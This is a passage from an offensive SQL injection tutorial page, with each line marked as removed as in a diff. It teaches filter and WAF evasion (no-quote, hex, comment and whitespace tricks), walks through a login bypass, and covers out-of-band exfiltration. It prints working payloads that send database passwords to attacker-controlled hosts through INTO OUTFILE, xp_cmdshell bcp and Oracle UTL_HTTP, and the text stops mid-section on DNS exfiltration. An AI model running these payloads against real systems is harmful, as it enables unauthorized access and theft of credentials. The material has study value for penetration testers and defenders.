-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-hacked_admin%27%20wHeRe%20username%3D%27admin%27%20--%20
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9ucmZkwMBVUmrgTbY1gXtA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This stealthy version avoids direct detection by the filter but still executes as intended after decoding by the database.</p>
-
-<h2 id="no-quote-sql-injection-attacking-without-quotes">No-Quote SQL Injection: Attacking Without Quotes</h2>
-
-<p>Sometimes when you’re probing a web app for SQL injection (SQLi) vulnerabilities, you’ll run into a filter that strips or escapes quotes (<code class="language-plaintext highlighter-rouge">'</code> or <code class="language-plaintext highlighter-rouge">"</code>). Normally, these quotes are essential in crafting payloads especially when targeting string-based SQL queries.</p>
-
-<p>But here’s the twist: <strong>quotes aren’t always necessary</strong>. There are stealthier methods to slip your payload through. We call this <strong>No-Quote SQL Injection</strong>. Let’s break it down.</p>
-
-<hr />
-
-<h3 id="1-numerical-injection-pure-logic-based-payloads">1. Numerical Injection (Pure Logic-Based Payloads)</h3>
-
-<p>If the backend is working with numeric data types (like <code class="language-plaintext highlighter-rouge">user_id</code>, <code class="language-plaintext highlighter-rouge">price</code>, or anything not enclosed in quotes), you can craft injections that don’t use quotes at all.</p>
-
-<p><strong>Example:</strong></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-?id=1 OR 1=1
-</code></pre>
-</div>
-
-<p>No quotes. No strings. Just logic. If the original query looks like:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT * FROM users WHERE id = 1;
-</code></pre>
-</div>
-
-<p>your injection turns it into:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT * FROM users WHERE id = 1 OR 1=1;
-</code></pre>
-</div>
-
-<p><strong>bypass achieved</strong>. The <code class="language-plaintext highlighter-rouge">OR 1=1</code> clause is always true, so it dumps all records.</p>
-
-<hr />
-
-<h3 id="2-sql-comments-to-kill-the-query">2. SQL Comments to Kill the Query</h3>
-
-<p>SQL comments (<code class="language-plaintext highlighter-rouge">--</code>, <code class="language-plaintext highlighter-rouge">#</code>, or <code class="language-plaintext highlighter-rouge">/* */</code>) are used to nullify the rest of the original query after your payload. This is super useful if you’re dealing with leftover query logic that could break your injection.</p>
-
-<p><strong>Example:</strong></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-?id=1--
-</code></pre>
-</div>
-
-<p>Imagine the original backend query is:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT * FROM users WHERE id = 1 AND active = 1;
-</code></pre>
-</div>
-
-<p>With the injection:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT * FROM users WHERE id = 1-- AND active = 1;
-</code></pre>
-</div>
-
-<p>Everything after <code class="language-plaintext highlighter-rouge">--</code> is ignored. You just chopped off the rest of the query. Mission complete.</p>
-
-<hr />
-
-<h3 id="3-string-building-without-quotes--using-concat">3. String Building Without Quotes – Using <code class="language-plaintext highlighter-rouge">CONCAT()</code></h3>
-
-<p>What if you need to inject strings (like usernames), but quotes are blocked? Enter: <strong>hex values + CONCAT()</strong>.</p>
-
-<p><strong>Example:</strong></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
-</code></pre>
-</div>
-
-<p>This builds the string <code class="language-plaintext highlighter-rouge">"admin"</code> using hex ASCII values.</p>
-
-<p>Why it works:</p>
-
-<ul>
-  <li>
-    <p>Bypasses quote filters.</p>
-  </li>
-  <li>
-    <p>Looks like a function call to the DB.</p>
-  </li>
-  <li>
-    <p>Flies under many WAFs.</p>
-  </li>
-</ul>
-
-<hr />
-
-<h2 id="no-spaces-allowed-no-problem">No-Spaces Allowed? No Problem</h2>
-
-<p>Now, let’s say the target also filters out <strong>spaces</strong>. That’s another layer of defense but it’s just an obstacle, not a dead end.</p>
-
-<hr />
-
-<h3 id="1-replace-spaces-with-comments">1. Replace Spaces with Comments</h3>
-
-<p>SQL allows multi-line comments using <code class="language-plaintext highlighter-rouge">/**/</code>. You can use these to replace spaces in your payload.</p>
-
-<p><strong>Example:</strong></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT/**/name/**/FROM/**/users
-</code></pre>
-</div>
-
-<p>This still executes as:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT name FROM users
-</code></pre>
-</div>
-
-<p>It’s fully functional and filters that look for the word <code class="language-plaintext highlighter-rouge">SELECT</code> followed by a space won’t catch it.</p>
-
-<hr />
-
-<h3 id="2-tab-t-and-newline-n-injection">2. Tab (<code class="language-plaintext highlighter-rouge">\t</code>) and Newline (<code class="language-plaintext highlighter-rouge">\n</code>) Injection</h3>
-
-<p>Filters may block ASCII space (0x20), but not other whitespace. Try:</p>
-
-<ul>
-  <li>
-    <p>Tab: <code class="language-plaintext highlighter-rouge">\t</code> or <code class="language-plaintext highlighter-rouge">%09</code></p>
-  </li>
-  <li>
-    <p>Newline: <code class="language-plaintext highlighter-rouge">\n</code> or <code class="language-plaintext highlighter-rouge">%0A</code></p>
-  </li>
-</ul>
-
-<p><strong>Example:</strong></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT%09name%0AFROM%09users
-</code></pre>
-</div>
-
-<p>Some backends will normalize these characters, giving you the same result as using spaces.</p>
-
-<hr />
-
-<h3 id="3-url-encoded-whitespace-payloads">3. URL-Encoded Whitespace Payloads</h3>
-
-<p>Other lesser-known whitespace characters:</p>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">%0C</code> (form feed)</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">%0D</code> (carriage return)</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">%A0</code> (non-breaking space)</p>
-  </li>
-</ul>
-
-<p>These can be strategically dropped into a URL-encoded injection payload to sneak past naïve filters.</p>
-
-<hr />
-
-<h2 id="note">Note</h2>
-
-<p>When dealing with heavy filtering, <strong>understand how the server parses input</strong>. The goal is to craft a syntactically valid query while avoiding the exact patterns WAFs are trained to detect.</p>
-
-<p>No-quote and no-space payloads are all about <strong>adaptive syntax evasion</strong>. Think like a compiler. Feed it what it accepts, not what looks normal.</p>
-
-<h1 id="bypassing-basic-sql-injection-filters-using-alternate-whitespace-characters">Bypassing Basic SQL Injection Filters Using Alternate Whitespace Characters</h1>
-
-<p>Imagine you’re pentesting a web app. The login form has a filter on the <code class="language-plaintext highlighter-rouge">username</code> input to block common SQL keywords and spaces trying to stop classic SQL injection attempts.</p>
-
-<p>Here’s what the developer coded:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-$filters = [' ', 'AND', 'and', 'OR', 'or', 'UNION', 'SELECT'];
-foreach ($filters as $filter) {
-    $username = str_replace($filter, '', $username);
-}
-</code></pre>
-</div>
-
-<p>This means <strong>any spaces and SQL keywords</strong> like <code class="language-plaintext highlighter-rouge">AND</code>, <code class="language-plaintext highlighter-rouge">OR</code>, <code class="language-plaintext highlighter-rouge">UNION</code>, <code class="language-plaintext highlighter-rouge">SELECT</code> get wiped out from the username before the query runs.</p>
-
-<hr />
-
-<h2 id="the-challenge">The Challenge</h2>
-
-<p>You try a basic SQL injection payload to bypass authentication:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-1' OR 1=1 --
-</code></pre>
-</div>
-
-<p><img src="https://cdn-images-1.medium.com/max/2000/1*c9bEDGQx5TaUGc50g1hPxA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>But the filter instantly strips spaces and keywords your input becomes:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-1'OR1=1--
-</code></pre>
-</div>
-
-<p>This mangled input breaks the SQL syntax, causing an error.</p>
-
-<p>You then try URL encoding spaces and special characters:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-1%27%20OR%201=1%20--+
-</code></pre>
-</div>
-
-<p><img src="https://cdn-images-1.medium.com/max/2000/1*c9bEDGQx5TaUGc50g1hPxA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>But no dice the server still filters spaces <em>after decoding</em>, so the spaces are removed again, and the payload fails.</p>
-
-<hr />
-
-<h2 id="finding-the-weak-spot">Finding the Weak Spot</h2>
-
-<p>The filter only targets literal <strong>space characters</strong> (<code class="language-plaintext highlighter-rouge">0x20</code>) and keywords in uppercase or lowercase. But it <strong>does not filter other whitespace characters</strong>, such as:</p>
-
-<ul>
-  <li>
-    <p>Tabs (<code class="language-plaintext highlighter-rouge">%09</code>)</p>
-  </li>
-  <li>
-    <p>Newlines (<code class="language-plaintext highlighter-rouge">%0A</code>)</p>
-  </li>
-  <li>
-    <p>Carriage returns (<code class="language-plaintext highlighter-rouge">%0D</code>)</p>
-  </li>
-</ul>
-
-<p>SQL parsers treat these alternate whitespace characters <strong>just like spaces</strong> when parsing queries.</p>
-
-<hr />
-
-<h2 id="the-bypass">The Bypass</h2>
-
-<p>So instead of spaces, you replace them with newline characters (<code class="language-plaintext highlighter-rouge">%0A</code>):</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-1'%0A||%0A1=1%0A--%27
-</code></pre>
-</div>
-
-<p>This payload, when URL-decoded, looks like:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-1'
-||
-1=1
---
-'
-</code></pre>
-</div>
-
-<p>The SQL engine reads the newlines as spaces and interprets the query as:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT username, password FROM users WHERE username = '1' || 1=1 --';
-</code></pre>
-</div>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">||</code> is the logical OR operator in some SQL dialects.</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">1=1</code> is always true.</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">--</code> comments out the rest of the query.</p>
-  </li>
-</ul>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4k-WTEUjdbt4Z6RTzI42Gg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>The result? The WHERE clause always passes, granting unauthorized access.</p>
-
-<h1 id="bypassing-wafs-and-filters-in-sql-injection-a-tactical-breakdown">Bypassing WAFs and Filters in SQL Injection: A Tactical Breakdown</h1>
-
-<p>When dealing with Web Application Firewalls (WAFs) or filter-based defenses, <strong>no single SQL injection technique is guaranteed to work across all environments</strong>. Filters are often tailored to block known attack patterns but they’re not perfect. Understanding their weaknesses and employing a flexible, adaptive mindset is key to bypassing them.</p>
-
-<p>Below is a curated list of common filtering scenarios, along with practical evasion techniques and real-world examples:</p>
-
-<table>
-  <thead>
-    <tr>
-      <th><strong>Scenario</strong></th>
-      <th><strong>Description</strong></th>
-      <th><strong>Bypass Example</strong></th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><strong>Keywords like <code class="language-plaintext highlighter-rouge">SELECT</code> are blocked</strong></td>
-      <td>WAFs may block exact keyword matches. Bypass by changing case or inserting inline comments.</td>
-      <td><code>SElEcT * FrOm users</code> or <code>SE/**/LECT * FROM/**/users</code></td>
-    </tr>
-    <tr>
-      <td><strong>Spaces are filtered</strong></td>
-      <td>Spaces are removed or blocked. Use alternative whitespace (e.g., <code class="language-plaintext highlighter-rouge">%0A</code>, <code class="language-plaintext highlighter-rouge">%09</code>) or inline comments.</td>
-      <td><code>SELECT%0A*%0AFROM%0Ausers</code> or <code>SELECT/**/username/**/FROM/**/users</code></td>
-    </tr>
-    <tr>
-      <td><strong>Logical operators like <code class="language-plaintext highlighter-rouge">AND</code>, <code class="language-plaintext highlighter-rouge">OR</code> are banned</strong></td>
-      <td>Filters block logical operators. Use alternatives like <code class="language-plaintext highlighter-rouge">&amp;&amp;</code>, <code class="language-plaintext highlighter-rouge">||</code>, or encoded logic.</td>
-      <td><code>username = 'admin' &amp;&amp; password = 'pass'</code> or <code>username = 'admin'%0A</code></td>
-    </tr>
-    <tr>
-      <td><strong>Keywords like <code class="language-plaintext highlighter-rouge">UNION</code>, <code class="language-plaintext highlighter-rouge">SELECT</code> are blocked</strong></td>
-      <td>Filters block keywords. Encode with <code class="language-plaintext highlighter-rouge">CHAR()</code>, Unicode, or hex to evade.</td>
-      <td><code>SELECT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)</code></td>
-    </tr>
-    <tr>
-      <td><strong>Deep keyword filtering (<code class="language-plaintext highlighter-rouge">OR</code>, <code class="language-plaintext highlighter-rouge">AND</code>, <code class="language-plaintext highlighter-rouge">SELECT</code>, <code class="language-plaintext highlighter-rouge">UNION</code>)</strong></td>
-      <td>Multiple keywords are filtered. Combine obfuscation: string functions, comments, concatenation.</td>
-      <td><code>SELECT * FROM users WHERE username = CONCAT('a','d','m','i','n')</code> or <code>SElEcT/**/username/**/FROM/**/users</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<hr />
-
-<h3 id="adapting-to-the-unknown-patience-and-precision">Adapting to the Unknown: Patience and Precision</h3>
-
-<p>In real-world engagements, <strong>you won’t always have clear feedback</strong> on what’s being filtered or blocked. WAFs may silently drop requests, sanitize payloads, or serve generic error pages making your job harder. That’s why <strong>SQLi is often trial-and-error based</strong>, especially under heavy defenses.</p>
-
-<p>Each target environment is unique:</p>
-
-<ul>
-  <li>
-    <p>Some filter payloads at the frontend.</p>
-  </li>
-  <li>
-    <p>Others rely on backend input sanitization.</p>
-  </li>
-  <li>
-    <p>Many use both layered defenses.</p>
-  </li>
-</ul>
-
-<p>To break through:</p>
-
-<ul>
-  <li>
-    <p><strong>Start small</strong> test with basic payloads.</p>
-  </li>
-  <li>
-    <p><strong>Probe with variations</strong> change syntax, encoding, and structure.</p>
-  </li>
-  <li>
-    <p><strong>Log everything</strong> track responses, delays, and subtle changes.</p>
-  </li>
-</ul>
-
-<p>It’s a chess match, not a sprint. <strong>WAFs can be defeated but only if you stay unpredictable.</strong></p>
-
-<h1 id="out-of-band-sql-injection-oob-sqli">Out-of-Band SQL Injection (OOB SQLi)</h1>
-
-<hr />
-
-<p><strong>What is Out-of-Band SQL Injection?</strong></p>
-
-<p>Out-of-Band SQL Injection (OOB SQLi) is a next-level attack vector used when traditional SQL injection methods (like error-based or boolean-based) are blocked, sanitized, or heavily monitored. Instead of relying on the same channel for both the attack and the response, OOB SQLi splits the communication: you inject through one path, and extract data via another.</p>
-
-<blockquote>
-  <p>Think: “I leave a hidden note in your house, but I read your reply off a billboard across town.”</p>
-</blockquote>
-
-<p>OOB SQLi turns external communication channels like DNS, HTTP, or SMB into covert exfiltration tunnels, letting attackers bypass firewalls, WAFs, and detection systems with surgical precision.</p>
-
-<hr />
-
-<p><strong>Attack Flow: How OOB SQLi Operates</strong></p>
-
-<ol>
-  <li>
-    <p><strong>Injection Point Identified:</strong> Attacker finds a vulnerable SQL input.</p>
-  </li>
-  <li>
-    <p><strong>Payload Delivered:</strong> Payload is crafted to force the database to perform an outbound action.</p>
-  </li>
-  <li>
-    <p><strong>External Callback:</strong> Database calls an external system (DNS, HTTP, SMB) controlled by the attacker.</p>
-  </li>
-  <li>
-    <p><strong>Exfiltration Complete:</strong> The attacker sniffs the outbound request and extracts the data completely out-of-band.</p>
-  </li>
-</ol>
-
-<p>This makes OOB SQLi perfect for stealthy ops in locked-down, segmented, or firewalled environments.</p>
-
-<hr />
-
-<p><strong>Why Use OOB SQL Injection?</strong></p>
-
-<p>Sometimes, you’re up against:</p>
-
-<ul>
-  <li>
-    <p><strong>Read-only or sanitized output</strong> (no direct response to your injection).</p>
-  </li>
-  <li>
-    <p><strong>Tight WAF/IDS filtering</strong>, blocking classic error or time-based SQLi.</p>
-  </li>
-  <li>
-    <p><strong>Air-gapped</strong> or segmented networks that block outbound HTTP but allow DNS or SMB.</p>
-  </li>
-  <li>
-    <p><strong>Stored procedures or encoding</strong> that neuter direct payload feedback.</p>
-  </li>
-</ul>
-
-<p>OOB is the ghost-in-the-wires solution it exploits internal-to-external communication channels, many of which are overlooked by defenders.</p>
-
-<hr />
-
-<p><strong>Techniques by DBMS</strong></p>
-
-<p>Let’s break it down by database engine each one has its own quirks and weaponizable features.</p>
-
-<hr />
-
-<h3 id="mysql--mariadb">MySQL / MariaDB</h3>
-
-<ul>
-  <li><strong>Technique:</strong> <a href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html"><code class="language-plaintext highlighter-rouge">SELECT</code></a>, <a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file"><code class="language-plaintext highlighter-rouge">load_file</code></a></li>
-  <li><strong>Purpose:</strong> Write query results to a local file on the server, which can then be accessed over SMB/HTTP.</li>
-</ul>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-SELECT password FROM users INTO OUTFILE '\\\\attacker.com\\share\\creds.txt';
-</code></pre>
-</div>
-
-<ul>
-  <li><strong>Fallback:</strong> If HTTP or DNS isn’t natively supported, use UDFs or external scripting to pivot.</li>
-</ul>
-
-<hr />
-
-<h3 id="microsoft-sql-server-mssql">Microsoft SQL Server (MSSQL)</h3>
-
-<ul>
-  <li>
-    <p><strong>Technique:</strong> <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16"><code class="language-plaintext highlighter-rouge">xp_cmdshell</code></a> , <code class="language-plaintext highlighter-rouge">OPENROWSET</code>, <code class="language-plaintext highlighter-rouge">BULK INSERT</code></p>
-  </li>
-  <li>
-    <p><strong>Purpose:</strong> Execute OS-level commands or import/export files via SMB or HTTP.</p>
-  </li>
-</ul>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-EXEC xp_cmdshell 'bcp "SELECT password FROM users" queryout "\\\\10.10.58.187\\logs\\creds.txt" -c -T';
-</code></pre>
-</div>
-
-<p>This leverages the built-in command execution features of MSSQL—pure gold for red teamers.</p>
-
-<hr />
-
-<h3 id="oracle">Oracle</h3>
-
-<ul>
-  <li>
-    <p><strong>Technique:</strong> <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html"><code class="language-plaintext highlighter-rouge">UTL_HTTP</code></a>, <code class="language-plaintext highlighter-rouge">UTL_INADDR</code>, <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html"><code class="language-plaintext highlighter-rouge">UTL_FILE</code></a></p>
-  </li>
-  <li>
-    <p><strong>Purpose:</strong> Make HTTP or DNS calls directly from within PL/SQL blocks.</p>
-  </li>
-</ul>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-DECLARE
-  req UTL_HTTP.REQ;
-BEGIN
-  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfil?data=' || (SELECT password FROM users WHERE username='admin'));
-  UTL_HTTP.GET_RESPONSE(req);
-END;
-</code></pre>
-</div>
-
-<p>Oracle’s support for outbound HTTP is a red carpet for stealthy exfil.</p>
-
-<hr />
-
-<p><strong>Real-World OOB Channels</strong></p>
-
-<p>OOB isn’t just a concept it lives in real, usable protocols. Here’s how attackers build tunnels out of a target:</p>
-
-<hr />
-
-<h3 id="http-based-exfiltration">HTTP-Based Exfiltration</h3>
-
-<p><strong>Mechanism:</strong> Database calls an external server via HTTP GET/POST request.</p>
-
-<p><strong>Example:</strong>
-A MySQL server with UDF support or a MSSQL server with HTTP client capability sends:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-GET http://evil-server.com/data?exfil=admin123
-</code></pre>
-</div>
-
-<p><strong>Advantage:</strong> Can ride through most outbound firewalls HTTP is almost always allowed.</p>
-
-<hr />
-
-<h3 id="dns-exfiltration">DNS Exfiltration</h3>
-
-<p><strong>Mechanism:</strong> Encodes data inside DNS queries.</p>
-
-<p><strong>Example:</strong><br />
